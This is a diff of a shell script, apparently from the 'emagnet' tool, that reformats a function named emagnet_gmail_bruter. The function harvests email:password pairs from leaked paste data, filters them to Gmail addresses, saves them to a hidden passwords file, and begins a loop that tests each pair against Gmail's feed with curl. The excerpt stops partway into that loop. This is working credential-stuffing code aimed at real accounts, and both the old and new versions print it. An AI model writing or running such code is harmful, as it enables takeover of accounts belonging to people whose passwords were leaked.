@@ -661,12 +661,19 @@ emagnet_spotify_bruter() {
         }
 
         emagnet_gmail_bruter() {
-            if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
+            if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP \
+                |grep '\S'\
+                |sed 's/|/:/g'\
+                |awk '{print $1}' \
+                |cut -d: -f2,3 \
+                |uniq\
+                |grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
 
-                grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
-                    |awk '{print $1}' \
-                    |cut -d: -f2,3 \
-                    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/'|grep -i 'gmail.com' >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
+                    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+                        |awk '{print $1}' \
+                        |cut -d: -f2,3 \
+                        |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/'|grep -i 'gmail.com' \
+                        >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
 
                 while read -r line; do
                     GMAIL_ATTACK=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o "xml")
